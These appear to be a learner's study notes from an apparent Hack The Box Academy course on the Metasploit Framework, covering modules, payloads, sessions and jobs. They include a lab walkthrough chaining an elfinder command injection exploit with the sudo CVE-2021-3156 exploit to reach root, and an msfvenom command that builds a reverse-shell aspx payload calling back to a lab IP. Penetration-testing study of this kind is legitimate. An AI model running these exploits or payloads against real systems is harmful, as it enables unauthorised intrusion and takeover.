# Academy - Introduction to the Metasploit Framework

Metasploit is not a jack of all trades but a swiss army knife with just enough tools to get us through the most common unpatched vulnerabilities  

<br />

## Metasploit Files

By default, all of the base files related to the Metasploit Framework can be found at `/usr/share/metasploit-framework` on our ParrotOS Security distro  
`Data` and `Lib` are the functioning parts of the msfconsole interface, while the `Documentation` folder contains all of the technical details about the project  

Modules are split into seperate categories in the `modules` folder  

`plugins`: Can be manually or automatically loaded as needed to provide extra functionality and automation during an assesment  
`scripts`: Meterpreter functionality and other useful scripts  
`tools`: Command line utilities that can be called directly from the msfconsole menu  

<br />

## MSFconsole

Installing/Updating MSF: `sudo apt update && sudo apt install metasploit-framework`  

<br />

## Modules

Metasploit modules are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild  
The `exploit` category consists of so-called proof-of-concept (POCs) that can be used to exploit existing vulnerabilities in a largely automated manner.  

**Metasploit module list syntax:** `<No.> <type>/<os>/<service>/<name>`  
**Example:** `794  exploit/windows/ftp/scriptftp_list`  

### Types
**Auxiliary:** Scanning, fuzzing, sniffing, and admin capabilities  
**Encoders:** Ensure that payloads are intact to their destination  
**Exploits:** Modules that exploit a vulnerability that will allow for the payload delivery  
**NOPs:** (No Operation Code) Keep the payload sizes consistent across exploit attempts  
**Payloads:** Code runs remotely and calls back to the attacker machine to establish a connection (or shell)  
**Plugins:** Additional Scripts can be integrated within an assesment with msfconsole and coexist  
**Post:** Wide array of modules to gather information, pivot deeper, etc.  
<br>
Auxiliary, Exploits, and Post are *initiators* (or interactable modules), meaning they can be used for payload delivery. They are used with the `use <no.>` command.  

### Searching for Modules

use `search`  
For example; `search eternalromance`  
Another example: `search type:exploit platform:windows cve:2021 rank:excellent microsoft`  

### Using Modules

To check which options are needed to be set before the exploit can be sent, we can use the `show options` command after selecting the module we want to use with the `use` command  

You can use the `info` command after selecting the module if we want to know something more about the module  

Use the `set <option> <value>` command while using a module to set options  
Use `setg` to make options selected permanent until the program is restarted  

`run` to run the module once everything is ready  
Remember you usually will have to set LHOST to be the tun (vpn) address for HTB stuff  

<br />

## Targets

Targets are identifiers which modify an exploit to work on different targets  
`show targets` issued within an exploit module will display all available targets for that module  

`set target <index no.>` command to pick a target from the list  

There is a very large variet of target types. Each target can vary from another by service pack, OS, and even language version.  

<br />

## Payloads

A payload refers to a module that aids the exploit module in (typically) returning a shell to the attacker  

There are three different types of payload modules in MSF: Singles, Stagers, and Stages  
Whether or not a payload is stages is represented by `/` in the payload name  
For example: `windows/shell_bind_tcp` is a single payload with no stage, whereas `windows/shell/bind_tcp` consists of a stager (bind_tcp) and a stage (shell)  

### Staged Payloads

A staged payload is, simply put, an exploitation process that is modularized and functionally seperated to help segregate the different functions it accomplshes into different code blocks, each completing its objective individually  
Stage0 of a staged payload represents the initial shellcode sent over the network to the target machine which has the sole purpose of initializing a connection back to the attacker machine  
Stage0 code also aims to read a larger, subsequent payload into memory once it arrives  

### Meterpreter Payload

The meterpreter payload is a specific type of multi-faceted payload that uses *DLL Injection* to ensure the connection to the victim host is stable, hard to detect, and persistent across reboots or system changes  

Once the meterpreter payload is executed, a new session is created, which spawns up the Meterpreter interface. It is very similar to the msfconsole interface, but all available commands are aimed at the target system.  

### Searching for Payloads

To see all of the available payloads use `show payloads`  
You can use grep to narrow down the search: `grep keyword show payloads`  

Use `set payload <no.>` after selecting an exploit module to select a payload

If you run `show payloads` with a exploit module selected, msfconsole will detect the OS of the target and only show payloads for that OS. 

<br />

## Plugins

Plugins work directly with the API and can be used to manipulate the entire framework. They can be useful for automating repetetive tasks, adding new commands to the msfconsole.  

To install new plugins take the .rb file provided on the maker's page and place it in the folder at `/usr/share/metasploit-framework/plugins` with the proper permissions.  

Load plugins with the load command. Ie: `load nessus`  

<br />

## Sessions and Jobs

MSFconsole can manage multiple modules at the same time. This is done with the use of sessions, which create dedicated control interfaces for all your deployed modules.  

Background a session by pressing ctrl + z or by typing `background` command.  

You can use the `sessions` command to view our currently active sessions.  

Use `sessions -i [no.]` to open a specific session  

### Jobs

Jobs are not very clearly explained here  
You can convert some types of tasks inside sessions into jobs to run in the background seamlessly.  
If a module is using a port and you ctrl + c it, the port will not be freed. The module will need to be terminated with the `jobs` command to do so.  

You can run an exploit as a job with `exploit -j`.  
`jobs -l` to list all running jobs  
`kill [index no.]` to kill a running job  
`jobs -K` to kill all running jobs  

<br />

## Sessions Practice Box

This was pretty good practice with sessions so will do a quick writeup:  

The box has a http server running on port 80. If you go to it in firefox and view page source, you can see 'elfinder' referenced a bunch  

`search elfinder` in msfconsole gives back `exploit/linux/http/elfinder_archive_cmd_injection` as one of its options.  
Using that exploit, set the RHOST to the target and **important**: set the LHOST to the vpn interface. Then run, and we get a shell as www-data user  

`sudo --version` shows that sudo version 1.8.31 is running. Searching the internet for sudo version 1.8.31 exploit shows that this version of sudo is vulnerable to CVE-2021-3156  

Leave the shell with ctrl + c. Then background the session with ctrl + z  
`search cve:2021-3156` in msfconsole gives back `linux/local/sudo_baron_samedit`  
**important:** We again need to set LHOST to be the vpn interface. It was set to the first network interface by default which was a problem.  
We then use the `sessions` command to find the id of our session, and `set SESSION [id.]` to tell the sudo exploit to use that session. Running the exploit we are informed that a new session has been created.  
We can use that session, which is a root shell with `sessions -i [id]`  

<br />

## Meterpreter

The meterpreter payload is a specific type of multi-faceted, extensible payload that uses DLL injection  

Whenever the Meterpreter Payload is sent and run on the target system, we receive a Meterpreter shell. We can then immediately issue the `help` command to see what the Meterpreter shell is capable of.  

<br />

## Writing and Importing Modules

This focuses on searching ExploitDB for readily available Metasploit modules, which we can import into our msfconsole  

You can search exploit DB with the tag `Metasploit Framework (MSF)` to show only scripts that are available in Metasploit module format  

Basically, download the .rb file, and copy it into the correct location  
ie: `cp ~/Downloads/9851.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb`  
Note: The snake case (underscore) naming convention is required for msf to properly recognize the module  

Then, in msfconsole, run the `reload all` command for the newly installed module to appear

### Porting Over Scripts into Metasploit Modules

To adapt Python, PHP, or any type of exploit script into a Metasploit module, we need to know the Ruby programming language. Ruby modules for metasploit are always written using hard tabs.

There is a lot of stuff here. Hopefully you don't have to write your own metasploit modules  

<br />

## Introduction to MSFVenom

MSFVenom is the successor to MSFPayload and MSFEncode, two standalone scripts that used to work in conjunction with msfconsole to provide users with highly customizable and hard-to-detect payloads for their exploits  

**Basic example:** reverse tcp connection  
In this example we get anonymous access to an FTP server, which can run .aspx scripts  
We use msfvenom to generate a reverse_tcp meterpreter shell in aspx format. `-f` specifies the format, `-p` stands for 'payload':  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx`  
Once the shell is uploaded, assuming we have a way to run it, we can use `multi/handler` to listen for the connection back:  
`msf6 > use multi/handler`  
This is basically like a metasploit netcat listener. Need to specify the LHOST and the LPORT  

<br />

## Local Exploit Suggester

This is sort of a random tip. There is a post module called local_exploit_suggestor which you can run on a session and it will tell you some potential vulnerabilities of the target machine  
